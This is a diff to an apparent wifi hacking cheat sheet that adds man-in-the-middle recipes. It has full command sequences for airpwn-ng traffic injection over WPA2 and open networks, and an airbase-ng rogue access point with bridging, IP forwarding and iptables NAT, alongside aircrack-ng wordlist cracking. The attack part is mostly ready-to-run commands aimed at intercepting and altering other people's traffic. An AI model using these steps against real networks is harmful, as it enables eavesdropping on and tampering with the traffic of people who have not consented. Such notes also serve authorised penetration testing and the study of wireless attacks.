@@ -55,8 +55,7 @@ Cracking
   aircrack-ng -w rockyou.txt mydump.pcap
 
 * For possible default password generators
-** https://hashcat.net/forum/thread-6170.html
-** https://deadcode.me/blog/2016/07/01/UPC-UBEE-EVW3226-WPA2-Reversing.html
+* https://hashcat.net/forum/thread-6170.html
 
 * And to generate a wordlist depending on a homepage
 
@@ -76,3 +75,35 @@ Man in the middle
 =================
 
 * Use wifiphisher
+* Or airpwn-ng with wpa2 support 
+
+.. code-block:: bash
+
+  airtun-ng -a <BSSID> -e <ESSID> -p <PSK> <Monitoring NIC>
+  ifconfig at0 up
+  python3 ./airpwn-ng -i <Injecting NIC> -m at0 --tun --injection payloads/demo --inj man
+
+* airpwn open network
+
+.. code-block:: bash
+
+  python3 ./airpwn-ng -i <Injecting NIC> -m <Monitoring NIC> --injection payloads/demo
+  
+* Or airbase-ng open network
+
+.. code-block:: bash
+
+  airbase-ng -a <ap_mac> --essid <ssid> -c <channel> wlp2s0
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+  dnsmasq
+  brctl addbr mitm
+  brctl addif mitm at0
+  brctl addif mitm <inet_iface>
+  ifconfig mitm up
+  iptables -F
+  iptables -F -t nat
+  iptables -P INPUT ACCEPT
+  iptables -P OUTPUT ACCEPT
+  iptables -P FORWARD ACCEPT
+  iptables -t nat -A POSTROUTING -o <inet_iface> -j MASQUERADE
+  
